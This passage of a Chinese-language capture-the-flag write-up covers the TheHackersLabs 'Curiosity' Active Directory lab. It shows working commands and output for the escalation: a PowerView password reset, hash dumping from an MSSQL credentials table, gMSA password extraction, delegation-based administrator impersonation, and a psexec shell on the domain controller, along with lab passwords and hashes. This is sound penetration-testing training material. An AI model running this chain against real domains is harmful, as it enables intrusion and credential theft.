\u003eTo DBA_ADM\u003c/h3\u003e\n\u003cp\u003e通过 \u003ccode\u003ebloodyAD\u003c/code\u003e 来修改其密码，失败了 ❌\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们远程上去通过 \u003ccode\u003ePowerShell\u003c/code\u003e 改\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$SecPassword\u003c/span\u003e = ConvertTo-SecureString \u003cspan class=\"hljs-string\"\u003e'$pr1ng@'\u003c/span\u003e -AsPlainText -Force\n\u003cspan class=\"hljs-variable\"\u003e$Cred\u003c/span\u003e = New-Object System.Management.Automation.PSCredential(\u003cspan class=\"hljs-string\"\u003e'HACKME\\jdoe'\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$SecPassword\u003c/span\u003e)\n\u003cspan class=\"hljs-variable\"\u003e$UserPassword\u003c/span\u003e = ConvertTo-SecureString \u003cspan class=\"hljs-string\"\u003e'Password123!'\u003c/span\u003e -AsPlainText -Force\n. ./PowerView.ps1\nSet-DomainUserPassword -Identity DBA_ADM -AccountPassword \u003cspan class=\"hljs-variable\"\u003e$UserPassword\u003c/span\u003e -Credential \u003cspan class=\"hljs-variable\"\u003e$Cred\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eTo sqlsvc\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n\n    Directory: C:\\Users\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       10/18/2024   8:34 AM                Administrator\nd-----       10/17/2024   4:53 PM                dba_adm\nd-----       10/17/2024   2:56 PM                jdoe\nd-----       10/17/2024   7:49 PM                MSSQL\u003cspan class=\"hljs-variable\"\u003e$SQLEXPRESS\u003c/span\u003e\nd-r---        9/12/2016   1:37 PM                Public\nd-----       10/18/2024   5:46 PM                sqlsvc\nd-----       10/17/2024   7:49 PM                SQLTELEMETRY\u003cspan class=\"hljs-variable\"\u003e$SQLEXPRESS\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ewinpeas\u003c/code\u003e 枚举时能看到数据库的管道\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们的用户应该是可以和数据库进行交互的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"SELECT @@VERSION\"\u003c/span\u003e\n\n--------------------------------------------------------------\nMicrosoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\n        Sep 24 2019 13:48:23\n        Copyright (C) 2019 Microsoft Corporation\n        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 \u0026#x3C;X64\u003e (Build 14393: ) (Hypervisor)\n\n(1 rows affected)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"select name FROM sys.databases\"\u003c/span\u003e\nname\n-------------------------------------------------------------------------------------------\ntempdb\nmodel\nmsdb\nCredentialsDB\n\n(5 rows affected)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"USE CredentialsDB;select name from  sys.tables\"\u003c/span\u003e\nChanged database context to \u003cspan class=\"hljs-string\"\u003e'CredentialsDB'\u003c/span\u003e.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nCredentials\n\n(1 rows affected)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"USE CredentialsDB;select * from Credentials\"\u003c/span\u003e\nChanged database context to \u003cspan class=\"hljs-string\"\u003e'CredentialsDB'\u003c/span\u003e.\nID          Username                                           Password\n----------- -------------------------------------------------- ---------------------------------------------\n          1 sqlsvc                                             23012244084524e51305f015727b890b\n\n(1 rows affected)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这样就读到了\u003ccode\u003esqlsvc\u003c/code\u003e用户的密码\u003c/p\u003e\n\u003cp\u003e到在线网站进行破解，得到密码 \u003ccode\u003eP@ssword1234!\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity nxc smb hackme.thl -u sqlsvc -p \u003cspan class=\"hljs-string\"\u003e'P@ssword1234!'\u003c/span\u003e\nSMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.8    445    DC               [+] hackme.thl\\sqlsvc:P@ssword1234! \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo GMSA_SVC$\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eSQLSVC\u003c/code\u003e 账户可以读取 \u003ccode\u003eGMAS\u003c/code\u003e 密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003egMSA\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  gMSADumper python gMSADumper.py -u sqlsvc -p \u003cspan class=\"hljs-string\"\u003e'P@ssword1234!'\u003c/span\u003e -d hackme.thl\nUsers or \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewho\u003c/span\u003e can \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GMSA_SVC$:\n \u003e GMSA_USERS\nGMSA_SVC$:::e1eef5023c307890fdbb047e6554cfd0\nGMSA_SVC$:aes256-cts-hmac-sha1-96:b6ec5a8b9a8b6053167b86b1ef724f3af27c3de4286a59a6bfcb293a37740b66\nGMSA_SVC$:aes128-cts-hmac-sha1-96:a6dc7233da4a2d54e340bb0131d9d921\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo Administrator\u003c/h3\u003e\n\u003cp\u003e我们寻找路径，发现\u003ccode\u003eGMSA_SVC$\u003c/code\u003e 对 \u003ccode\u003eDC\u003c/code\u003e 有 \u003ccode\u003eAllowToAct\u003c/code\u003e 权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAllowToAct\u003c/code\u003e 就是 \u003ccode\u003eAllowedToActOnBehalfOfOtherIdentity\u003c/code\u003e ，\u003ccode\u003eGMSA_SVC\u003c/code\u003e 已添加到 \u003ccode\u003eDC.HACKME.THL\u003c/code\u003e 上的 \u003ccode\u003emsds-AllowedToActOnBehalfOfOtherIdentity\u003c/code\u003e 属性中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity getST.py -spn \u003cspan class=\"hljs-string\"\u003e'cifs/DC.hackme.thl'\u003c/span\u003e -impersonate \u003cspan class=\"hljs-string\"\u003e'administrator'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'hackme.thl/GMSA_SVC$'\u003c/span\u003e -hashes :e1eef5023c307890fdbb047e6554cfd0\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\n[*] Impersonating administrator\n[*] Requesting S4U2Proxy\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e administrator@cifs_DC.hackme.thl@HACKME.THL.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=administrator@cifs_DC.hackme.thl@HACKME.THL.ccache \n\n➜  Curiosity psexec.py administrator@dc.hackme.thl -k -no-pass\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on dc.hackme.thl.....\n[*] Found writable share ADMIN$\n[*] Uploading file vgKATdFu.exe\n[*] Opening SVCManager on dc.hackme.thl.....\n[*] Creating service VDYV on dc.hackme.thl.....\n[*] Starting service VDYV.....\n[!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\Users\\Administrator\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n24axxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e不算难，除了爆破的字典有点不明所以\u003c/p\u003e\n\u003cp\u003e最后一步，直接看 \u003ccode\u003eGMSA_SVC$\u003c/code\u003e 的 \u003ccode\u003eOutBound Execution\u003c/code\u003e是空的，但自己寻找路径又能找到就有点奇怪\u003c/p\u003e\n\u003cp\u003e下面的脚本为什么我们可以截取到 \u003ccode\u003ejdoe\u003c/code\u003e 用户的\u003ccode\u003eNET NTLM HASH\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\temp\u003e \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e shareconnect.ps1\n\n\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$true\u003c/span\u003e) {\n    \u003cspan class=\"hljs-comment\"\u003e# Comando net use para reconectar el recurso compartido\u003c/span\u003e\n    net use Z: \\\\SQLserver\\bbdd /user:hackme\\jdoe \u003cspan class=\"hljs-string\"\u003e'$pr1ng@'\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# Espera de 1 minuto antes de volver a ejecutar\u003c/span\u003e\n    Start-Sleep -Seconds 60\n}\n\u003c/code\u003e\u003c/pre\u003e","title":"TheHackersLabs - Curiosity","date":"2025-07-19","updated":"2025-07-19","tags":["TheHackersLabs","Windows","AD","Responder","MSSQL","gMSA"],"categories":"靶机","comments":true,"description":"Curiosity https://labs.thehackerslabs.com/machine/23 Recon PortScan nmap 端口扫描 UDP 也扫描 枚举测试 因为没有 Web 端口，我们从 SMB 服务开始枚举 测试匿名账户 在这里尝试枚举了很久，没结果 responder..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"H
